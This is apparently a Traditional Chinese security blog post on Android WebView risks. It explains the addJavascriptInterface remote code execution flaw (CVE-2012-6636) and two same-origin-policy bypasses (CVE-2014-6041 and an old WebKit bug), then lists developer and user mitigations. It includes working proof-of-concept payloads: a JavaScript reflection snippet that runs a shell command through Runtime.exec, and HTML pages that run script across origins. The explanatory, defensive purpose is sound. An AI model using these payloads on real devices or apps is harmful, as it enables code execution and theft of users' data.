---

title: "Android WebView 為你的使用者打開了漏洞之門你知道嗎？"
description: "廣為 Android 開發者所使用的 WebView，在你打開了 JavaScript 功能的時候，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生你知道嗎？我們在下面的文章為大家對這些風險漏洞做個整理。"
category: "技術專欄"
tags: [Mobile, Android, WebView, UXSS]
author: "anfa"
keywords: "WebView, UXSS, CVE"
image: "https://lh3.googleusercontent.com/-BtDqPupmJiA/VDy2gz9bkQI/AAAAAAAAAuM/liUV3DXWcuE/s500-no/14773948755_6f8774540b_o.jpg"
image_credit: "https://www.flickr.com/photos/chrisgold/14773948755/in/photostream/"
image_caption: "Chris Goldberg(flickr)"
---

為了解決在應用程式中顯示網頁的需求，開發者一般會使用到由系統提供的 WebView 元件。而由於 JavaScript 被廣泛應用在網頁上，開發者通常也會把 WebView 處理 JavaScript 的功能打開，好讓大部分網頁能正常運作。但就在開啟這個像是必不可少的 JavaScript 功能時，背後一些由於系統漏洞而引發出來意想不到的風險卻有機會由此而生。接下來的部分將把這些漏洞為大家做個整理。


READMORE

### 相關漏洞

#### 1. 遠端代碼執行 (Remote Code Execution)

##### 風險：木馬跳板，個資被盜
目前有機會發生 RCE 風險都圍繞在 [addJavascriptInterface][] 這個功能上，該功能原意是為被載入的網頁和原生程式間建立一個"橋樑"，通過預先設定好的介面，讓網頁能呼叫指定的公開函式並取得函式回傳的結果。

{% highlight java %}
class JsObject {
    public String toString() { return "Hello World"; }
}

webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsObject(), "injectedObject");
webView.loadUrl("http://www.example.com/");
{% endhighlight %}

{% highlight html %}
<html>
    <head>…
    <script>
       alert(injectedObject.toString()); // return "Hello World"
    </script>
    </head>
    <body>…</body>
</html>
{% endhighlight %}

像上面的例子裡，網頁能通過預先設定好的 "injectedObject" 介面，呼叫 "toString" 函式，得到 "Hello World" 這個字串。

其漏洞 [CVE-2012-6636](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636) 最早在2012年12月被[公佈](http://50.56.33.56/blog/?p=314)出來，攻擊者有機會利用他通過 Java Reflection API 來執行任意代碼。影響 Android 1.X ~ 4.1。

{% highlight html %}
<script>
    function execute(cmdArgs) {
        return injectedObject.getClass().forName("java.lang.Runtime")
                              .getMethod("getRuntime",null)
                              .invoke(null,null).exec(cmdArgs);
    }
    execute(["/system/bin/sh","-c","cat vuln >> attacker.txt"]);
</script>
{% endhighlight %}

其後 Google 在 Android 4.2 開始對 [addJavascriptInterface][] 的使用方式加了限制，使用時需要在 Java 端把可被網頁執行的公開函式透過 @JavascriptInterface 來標註。並奉勸開發者別在 4.1 或之前的系統上使用 [addJavascriptInterface][]。

可是是否開發者只要在受影響的系統上不主動使用 [addJavascriptInterface][] 就能解決問題呢？答案是否定的。

在 Android 3.X ~ 4.1 上，WebView 預設會用 [addJavascriptInterface][] 添加一個叫 "searchBoxJavaBridge\_" 的介面。開發者如果沒有注意的話就會同樣會讓使用者陷入風險中。很巧合地，從 Android 3.0 開始 Google 加入了 [removeJavascriptInterface][] 函式讓開發者可以移定指定的介面。所以開發者可以使用該函式在受影響的系統上把 "searchBoxJavaBridge\_" 移除。

除了 "searchBoxJavaBridge\_" 外，還有兩個介面會在特定情況下被加到 WebView 中。若使用者有在手機上 [系統設定] 裡的 [協助工具]，打開 [服務] 子分類中的任何一個項目，系統就會對其後建立的 WebView 自動加上 "accessibility" 和 "accessibilityTraversal"這兩個介面。這行為在 Android 4.4 由於[舊版 WebView 被取代](https://android.googlesource.com/platform/frameworks/base/+/94c0057d67c2e0a4b88a4f735388639210260d0e)而消失了。

![Android 協助工具服務][android_accessibility_service]


#### 防範

作為開發者

* 如非需要，關閉 JavaScript 功能 (預設關閉)
* 可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料
* 在有風險的系統中停用 [addJavascriptInterface][]
* 在有風險的系統中使用 [removeJavascriptInterface][] 移除系統自帶的介面

作為使用者

* 如非需要，關閉 [不明的來源] 選項 (預設關閉)
* 使用 Android 4.2 或以上不受影響的系統
* 勿在受影響的系統上使用機敏服務或儲存機敏資料

![Android 不明的來源][android_unknown_source]


#### 2. 繞過同源策略 (Same-Origin Policy bypass)

##### 風險：個資被盜
為防止網頁在載入外部資源時引發安全問題，瀏覽器會實作[同源策略](https://developer.mozilla.org/zh-TW/docs/Web/JavaScript/Same_origin_policy_for_JavaScript)以限制程式碼和不同網域資源間的互動。

其中 [CVE-2014-6041](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6041) 漏洞，通過程式在處理 \u0000 (unicode null byte) 時的失誤而繞過了原有的限制。

{% highlight html %}
<html>
    <head>
        <title>CVE-2014-6041 UXSS DEMO</title>
    </head>
    <body>
        <iframe name="target_frame" src="http://devco.re/"></iframe>
        <br />
        <input type="button" value="go" onclick="window.open('\u0000javascript:alert(document.domain)',
'target_frame')" />
    </body>
</html>
{% endhighlight %}

如果上面的網頁是放置在與 <http://devco.re/> 不同源的地方，正常來說點擊按鈕後會因為 SOP 的關係，該段 JavaScript 無法執行而不會有反應。但在受影響的環境裡則能順利執行並跳出 "devco.re" 這個網域名稱。

上述問題被發現後沒多久，再由相同研究員發現一個早在多年前已經被修正的 [WebKit 臭蟲](http://trac.webkit.org/changeset/96826)仍然出現在 Android 4.3 及之前的版本上。

{% highlight html %}
<script>
window.onload = function()
{
    object = document.createElement("object");
    object.setAttribute("data", "http://www.bing.com");
    document.body.appendChild(object);
    object.onload = function() {
      object.setAttribute("data", "javascript:alert(document.domain)");
        object.innerHTML = "foobar";
    }
}
</script>

上述的跨來源操作同樣違反了 SOP，應當被拒絕執行。但他卻能在有風險的 WebView 上被執行，造成風險。

{% endhighlight %}

#### 防範

作為開發者

* 如非需要，關閉 JavaScript 功能 (預設關閉)
* 可考慮把網頁當作範本儲存在應用內，再用其他途徑載入資料

作為使用者

* 如非需要，關閉 [不明的來源] 選項 (預設關閉)
* 使用 Android 4.4 或以上不受影響的系統

### 結語

談到這裡大家可能會有個疑問，如果應用程式中所載入的遠端網頁網址都是固定，受開發者控制的，應該就會安全沒有風險。還記得在 [被忽略的 SSL 處理](http://devco.re/blog/2014/08/15/ssl-mishandling-on-mobile-app-development/) 裡提及過的中間人攻擊嗎？如果連線過程是採用明文的 HTTP ，或是加密的 HTTPS 但沒落實做好憑證檢查，內容就有機會被攻擊者竊取修改，再結合上面提到的漏洞，對使用者帶來的影響則大大增加。

下面我們製作了一段結合中間人攻擊與 addJavascriptInterface 漏洞，模擬使用者手機被入侵的影片：

{% youtube reKEu-Ajo50 %}

從影片的最後可以看到，攻擊者取得存在漏洞的應用程式權限，並取得裡面的機敏資料。

而在繞過同源策略問題上，無論是透過 null byte 或是設定屬性來達到，其實都是屬於存在已久的手法，多年前在別的平台、瀏覽器上就已經發生過，除了編寫上的疏忽外，缺乏一個完整的測試流程去做檢查相信也是其中一個原因。

Android 的生態系統問題，使得大多數的使用者手機未能跟得上系統更新的步驟，讓他們即使知道自己所使用系統存在問題也愛莫能助。

作為開發商，應需要在系統支援度與其相應存在的安全風險中取得平衡，來決定應用程式所支援的最低版本為何。最後作為一個負責任的開發者，應為已被公開的漏洞做好應對措施，避免使用者暴露在風險當中。

### 參考
- [Abusing WebView JavaScript Bridges](http://50.56.33.56/blog/?p=314)
- [Android Browser Same Origin Policy Bypass < 4.4 - CVE-2014-6041](http://www.rafayhackingarticles.net/2014/08/android-browser-same-origin-policy.html)
- [A Tale Of Another SOP Bypass In Android Browser < 4.4](http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html)

[addJavascriptInterface]: http://developer.android.com/reference/android/webkit/WebView.html#addJavascriptInterface(java.lang.Object, java.lang.String)

[removeJavascriptInterface]: http://developer.android.com/reference/android/webkit/WebView.html#removeJavascriptInterface(java.lang.String)
[android_accessibility_service]: https://lh4.googleusercontent.com/-JOttiWUazYQ/VDwYQnYdK9I/AAAAAAAAAts/Bmfp29QdqCY/w277-h492-no/android_accessibility_service.png
[android_unknown_source]: https://lh3.googleusercontent.com/-4jQ2fAT2JXc/VDwYNA824HI/AAAAAAAAAtg/bF4CIHm5v9M/w295-h492-no/android_unknown_source.png
